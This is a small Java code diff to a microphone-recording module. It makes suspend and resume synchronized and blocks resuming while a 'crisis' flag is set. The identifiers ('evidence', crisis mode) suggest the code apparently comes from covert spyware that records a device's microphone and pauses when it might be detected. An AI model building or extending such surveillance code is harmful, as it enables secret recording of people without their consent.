@@ -572,7 +572,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	}
 
 	@Override
-	public void suspend() {
+	public synchronized void suspend() {
 		if (!isSuspended()) {
 			super.suspend();
 			saveRecorderEvidence();
@@ -585,8 +585,8 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	}
 
 	@Override
-	public void resume() {
-		if (isSuspended()) {
+	public synchronized void resume() {
+		if (isSuspended() && !Status.crisisMic()) {
 			try {
 				startRecorder();
 			} catch (final IllegalStateException e) {
